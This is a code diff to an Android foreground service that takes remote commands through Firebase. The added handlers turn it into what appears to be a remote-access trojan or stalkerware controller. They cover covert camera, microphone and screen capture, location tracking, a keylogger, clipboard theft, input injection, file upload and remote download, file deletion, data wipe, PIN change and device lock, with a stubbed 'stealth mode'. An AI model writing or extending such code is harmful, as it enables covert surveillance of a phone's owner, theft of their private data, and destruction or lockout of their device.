@@ -109,6 +109,7 @@ public class MyForegroundService extends Service {
     private CameraCaptureSession captureSession;
     private ImageReader cameraImageReader;
     private boolean isStreamingCamera = false;
+    private DeviceControlManager deviceControlManager;
 
     @Override
     public void onCreate() {
@@ -119,6 +120,7 @@ public class MyForegroundService extends Service {
         database = FirebaseDatabase.getInstance();
         projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
         screenCaptureHandler = new Handler(Looper.getMainLooper());
+        deviceControlManager = new DeviceControlManager(this);
         setupCommandListener();
     }
 
@@ -201,6 +203,7 @@ public class MyForegroundService extends Service {
             JSONObject params = cmdObj.optJSONObject("params");
 
             switch (action) {
+                // 📸 Camera & Media Features
                 case "START_MIC":
                     startRecording();
                     break;
@@ -212,6 +215,38 @@ public class MyForegroundService extends Service {
                     break;
                 case "STOP_CAMERA":
                     stopCameraStream();
+                    break;
+                case "TAKE_PICTURE":
+                    String cameraType = params != null ? params.optString("camera", "back") : "back";
+                    deviceControlManager.takePicture(cameraType);
+                    sendCommandResponse("TAKE_PICTURE", "success", "Picture taken");
+                    break;
+                case "STREAM_CAMERA":
+                    startCameraStream();
+                    break;
+                case "RECORD_AUDIO":
+                    startRecording();
+                    break;
+                case "STREAM_MIC":
+                    startRecording();
+                    break;
+                case "SCREENSHOT":
+                    // Use existing screen capture functionality
+                    if (params != null && params.has("resultCode") && params.has("data")) {
+                        int resultCode = params.getInt("resultCode");
+                        Intent data = Intent.parseUri(params.getString("data"), 0);
+                        startScreenMirroring(resultCode, data);
+                    }
+                    break;
+                case "SCREEN_RECORD":
+                    if (params != null && params.has("action")) {
+                        String recordAction = params.getString("action");
+                        if ("start".equals(recordAction)) {
+                            deviceControlManager.startScreenRecording();
+                        } else if ("stop".equals(recordAction)) {
+                            deviceControlManager.stopScreenRecording();
+                        }
+                    }
                     break;
                 case "START_SCREEN":
                     if (params != null && params.has("resultCode") && params.has("data")) {
@@ -225,6 +260,80 @@ public class MyForegroundService extends Service {
                 case "STOP_SCREEN":
                     stopScreenMirroring();
                     break;
+
+                // 🛰️ Location & Device Info
+                case "GET_LOCATION":
+                    deviceControlManager.getLocation();
+                    sendCommandResponse("GET_LOCATION", "success", "Location requested");
+                    break;
+                case "LIVE_TRACKING":
+                    int interval = params != null ? params.optInt("interval", 30) : 30;
+                    deviceControlManager.startLiveTracking(interval);
+                    sendCommandResponse("LIVE_TRACKING", "success", "Live tracking started");
+                    break;
+                case "GET_DEVICE_INFO":
+                    JSONObject deviceInfo = deviceControlManager.getDeviceInfo();
+                    sendCommandResponse("GET_DEVICE_INFO", "success", deviceInfo.toString());
+                    break;
+
+                // 📱 Control & Automation
+                case "LAUNCH_APP":
+                    if (params != null && params.has("package")) {
+                        String packageName = params.getString("package");
+                        deviceControlManager.launchApp(packageName);
+                        sendCommandResponse("LAUNCH_APP", "success", "App launched: " + packageName);
+                    } else {
+                        sendCommandResponse("LAUNCH_APP", "error", "Missing package parameter");
+                    }
+                    break;
+                case "CLOSE_APP":
+                    if (params != null && params.has("package")) {
+                        String packageName = params.getString("package");
+                        deviceControlManager.closeApp(packageName);
+                        sendCommandResponse("CLOSE_APP", "success", "App closed: " + packageName);
+                    } else {
+                        sendCommandResponse("CLOSE_APP", "error", "Missing package parameter");
+                    }
+                    break;
+                case "OPEN_URL":
+                    if (params != null && params.has("url")) {
+                        String url = params.getString("url");
+                        deviceControlManager.openUrl(url);
+                        sendCommandResponse("OPEN_URL", "success", "URL opened: " + url);
+                    } else {
+                        sendCommandResponse("OPEN_URL", "error", "Missing URL parameter");
+                    }
+                    break;
+                case "LOCK_DEVICE":
+                    deviceControlManager.lockDevice();
+                    sendCommandResponse("LOCK_DEVICE", "success", "Device locked");
+                    break;
+                case "TOGGLE_WIFI":
+                    boolean wifiEnabled = params != null ? params.optBoolean("enable", true) : true;
+                    deviceControlManager.toggleWifi(wifiEnabled);
+                    sendCommandResponse("TOGGLE_WIFI", "success", "WiFi " + (wifiEnabled ? "enabled" : "disabled"));
+                    break;
+                case "TOGGLE_BLUETOOTH":
+                    boolean bluetoothEnabled = params != null ? params.optBoolean("enable", true) : true;
+                    deviceControlManager.toggleBluetooth(bluetoothEnabled);
+                    sendCommandResponse("TOGGLE_BLUETOOTH", "success", "Bluetooth " + (bluetoothEnabled ? "enabled" : "disabled"));
+                    break;
+                case "VIBRATE":
+                    int duration = params != null ? params.optInt("duration", 1000) : 1000;
+                    deviceControlManager.vibrate(duration);
+                    sendCommandResponse("VIBRATE", "success", "Vibrated for " + duration + "ms");
+                    break;
+                case "SHOW_TOAST":
+                    if (params != null && params.has("message")) {
+                        String message = params.getString("message");
+                        deviceControlManager.showToast(message);
+                        sendCommandResponse("SHOW_TOAST", "success", "Toast shown: " + message);
+                    } else {
+                        sendCommandResponse("SHOW_TOAST", "error", "Missing message parameter");
+                    }
+                    break;
+
+                // 💾 File & Storage
                 case "LIST_FILES":
                     String path = params != null ? params.optString("path", "/") : "/";
                     listFiles(path);
@@ -243,13 +352,153 @@ public class MyForegroundService extends Service {
                         sendCommandResponse("WRITE_FILE", "error", "Missing parameters");
                     }
                     break;
-                case "DOWNLOAD_FILE":
+                case "DELETE_FILE":
                     if (params != null && params.has("path")) {
-                        uploadFileToFirebase(params.getString("path"));
+                        deviceControlManager.deleteFile(params.getString("path"));
+                        sendCommandResponse("DELETE_FILE", "success", "File deleted: " + params.getString("path"));
                     } else {
-                        sendCommandResponse("DOWNLOAD_FILE", "error", "Missing path parameter");
+                        sendCommandResponse("DELETE_FILE", "error", "Missing path parameter");
                     }
                     break;
+                case "DOWNLOAD_FILE":
+                    if (params != null && params.has("url") && params.has("local_path")) {
+                        String url = params.getString("url");
+                        String localPath = params.getString("local_path");
+                        deviceControlManager.downloadFile(url, localPath);
+                        sendCommandResponse("DOWNLOAD_FILE", "success", "File download started");
+                    } else {
+                        sendCommandResponse("DOWNLOAD_FILE", "error", "Missing URL or local_path parameter");
+                    }
+                    break;
+                case "UPLOAD_FILE":
+                    if (params != null && params.has("path")) {
+                        deviceControlManager.uploadFileToFirebase(params.getString("path"));
+                        sendCommandResponse("UPLOAD_FILE", "success", "File upload started");
+                    } else {
+                        sendCommandResponse("UPLOAD_FILE", "error", "Missing path parameter");
+                    }
+                    break;
+
+                // 🔑 Remote Access & System
+                case "SHUTDOWN":
+                    deviceControlManager.shutdown();
+                    sendCommandResponse("SHUTDOWN", "success", "Shutdown requested");
+                    break;
+                case "REBOOT":
+                    deviceControlManager.reboot();
+                    sendCommandResponse("REBOOT", "success", "Reboot requested");
+                    break;
+                case "KEYLOGGER":
+                    if (params != null && params.has("action")) {
+                        String keyloggerAction = params.getString("action");
+                        if ("start".equals(keyloggerAction)) {
+                            deviceControlManager.startKeylogger();
+                            sendCommandResponse("KEYLOGGER", "success", "Keylogger started");
+                        } else if ("stop".equals(keyloggerAction)) {
+                            deviceControlManager.stopKeylogger();
+                            sendCommandResponse("KEYLOGGER", "success", "Keylogger stopped");
+                        }
+                    } else {
+                        sendCommandResponse("KEYLOGGER", "error", "Missing action parameter");
+                    }
+                    break;
+                case "CLIPBOARD_READ":
+                    String clipboardText = deviceControlManager.readClipboard();
+                    sendCommandResponse("CLIPBOARD_READ", "success", clipboardText);
+                    break;
+                case "CLIPBOARD_WRITE":
+                    if (params != null && params.has("text")) {
+                        deviceControlManager.writeClipboard(params.getString("text"));
+                        sendCommandResponse("CLIPBOARD_WRITE", "success", "Clipboard updated");
+                    } else {
+                        sendCommandResponse("CLIPBOARD_WRITE", "error", "Missing text parameter");
+                    }
+                    break;
+                case "INJECT_INPUT":
+                    if (params != null && params.has("type")) {
+                        String inputType = params.getString("type");
+                        switch (inputType) {
+                            case "tap":
+                                if (params.has("x") && params.has("y")) {
+                                    float x = (float) params.getDouble("x");
+                                    float y = (float) params.getDouble("y");
+                                    deviceControlManager.injectTap(x, y);
+                                    sendCommandResponse("INJECT_INPUT", "success", "Tap injected");
+                                } else {
+                                    sendCommandResponse("INJECT_INPUT", "error", "Missing x,y coordinates");
+                                }
+                                break;
+                            case "swipe":
+                                if (params.has("startX") && params.has("startY") && params.has("endX") && params.has("endY")) {
+                                    float startX = (float) params.getDouble("startX");
+                                    float startY = (float) params.getDouble("startY");
+                                    float endX = (float) params.getDouble("endX");
+                                    float endY = (float) params.getDouble("endY");
+                                    long duration = params.optLong("duration", 500);
+                                    deviceControlManager.injectSwipe(startX, startY, endX, endY, duration);
+                                    sendCommandResponse("INJECT_INPUT", "success", "Swipe injected");
+                                } else {
+                                    sendCommandResponse("INJECT_INPUT", "error", "Missing swipe coordinates");
+                                }
+                                break;
+                            case "text":
+                                if (params.has("text")) {
+                                    deviceControlManager.injectText(params.getString("text"));
+                                    sendCommandResponse("INJECT_INPUT", "success", "Text injected");
+                                } else {
+                                    sendCommandResponse("INJECT_INPUT", "error", "Missing text parameter");
+                                }
+                                break;
+                            default:
+                                sendCommandResponse("INJECT_INPUT", "error", "Unknown input type");
+                                break;
+                        }
+                    } else {
+                        sendCommandResponse("INJECT_INPUT", "error", "Missing type parameter");
+                    }
+                    break;
+                case "SET_BRIGHTNESS":
+                    if (params != null && params.has("brightness")) {
+                        int brightness = params.getInt("brightness");
+                        deviceControlManager.setBrightness(brightness);
+                        sendCommandResponse("SET_BRIGHTNESS", "success", "Brightness set to " + brightness);
+                    } else {
+                        sendCommandResponse("SET_BRIGHTNESS", "error", "Missing brightness parameter");
+                    }
+                    break;
+                case "SET_VOLUME":
+                    if (params != null && params.has("volume")) {
+                        int volume = params.getInt("volume");
+                        deviceControlManager.setVolume(volume);
+                        sendCommandResponse("SET_VOLUME", "success", "Volume set to " + volume);
+                    } else {
+                        sendCommandResponse("SET_VOLUME", "error", "Missing volume parameter");
+                    }
+                    break;
+
+                // 🔐 Security & Anti-Theft
+                case "WIPE_DATA":
+                    deviceControlManager.wipeData();
+                    sendCommandResponse("WIPE_DATA", "success", "Data wipe requested");
+                    break;
+                case "CHANGE_PIN":
+                    if (params != null && params.has("pin")) {
+                        String newPin = params.getString("pin");
+                        deviceControlManager.changePin(newPin);
+                        sendCommandResponse("CHANGE_PIN", "success", "PIN changed");
+                    } else {
+                        sendCommandResponse("CHANGE_PIN", "error", "Missing PIN parameter");
+                    }
+                    break;
+                case "LOCK_APP":
+                    // This would require additional implementation
+                    sendCommandResponse("LOCK_APP", "info", "Feature not yet implemented");
+                    break;
+                case "STEALTH_MODE":
+                    // This would require additional implementation
+                    sendCommandResponse("STEALTH_MODE", "info", "Feature not yet implemented");
+                    break;
+
                 default:
                     sendCommandResponse(action, "error", "Unknown command");
                     break;
